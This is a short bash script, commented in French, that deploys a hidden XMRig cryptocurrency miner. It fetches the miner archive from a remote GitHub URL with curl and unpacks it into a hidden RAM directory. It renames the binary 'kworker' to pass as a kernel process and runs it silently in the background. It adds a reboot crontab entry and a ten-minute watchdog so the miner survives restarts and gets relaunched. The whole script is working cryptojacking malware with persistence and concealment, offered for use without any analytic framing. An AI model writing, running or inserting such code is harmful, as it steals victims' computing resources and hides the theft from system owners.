#!/bin/bash

DIR="/dev/shm/.syslog"
BIN="kworker"
ARCHIVE_URL="https://raw.githubusercontent.com/ThipyThipy/machinee/main/xmrig.tar.gz"
PERSIST_DIR="$HOME/.cache/sysconfig"
PERSIST_ARCHIVE="$PERSIST_DIR/xmrig.tar.gz"

# Créer les dossiers
mkdir -p "$DIR" "$PERSIST_DIR" && cd "$DIR" || exit 1

# Télécharger et extraire
curl -fsSL "$ARCHIVE_URL" -o miner.tar.gz
tar -xzf miner.tar.gz

# Trouver le nom du binaire automatiquement
BIN_FILE=$(find . -type f -executable -name "*" | head -n 1)
mv "$BIN_FILE" "$BIN"
chmod +x "$BIN"

# Lancer furtif
nohup nice -n 19 "$DIR/$BIN" --config="$DIR/cfg.json" > /dev/null 2>&1 &

# Sauvegarde dans un dossier utilisateur persistant
cp miner.tar.gz "$PERSIST_ARCHIVE"

# Crontab reboot : re-déploiement en RAM depuis cache perso
(crontab -l 2>/dev/null; echo "@reboot sleep \$((RANDOM % 60)) && mkdir -p /dev/shm/.syslog && tar -xzf $PERSIST_ARCHIVE -C /dev/shm/.syslog && /dev/shm/.syslog/kworker --config=/dev/shm/.syslog/cfg.json > /dev/null 2>&1") | crontab -

# Watchdog
(crontab -l 2>/dev/null; echo "*/10 * * * * pgrep -f $BIN > /dev/null || (mkdir -p /dev/shm/.syslog && tar -xzf $PERSIST_ARCHIVE -C /dev/shm/.syslog && /dev/shm/.syslog/kworker --config=/dev/shm/.syslog/cfg.json > /dev/null 2>&1)") | crontab -
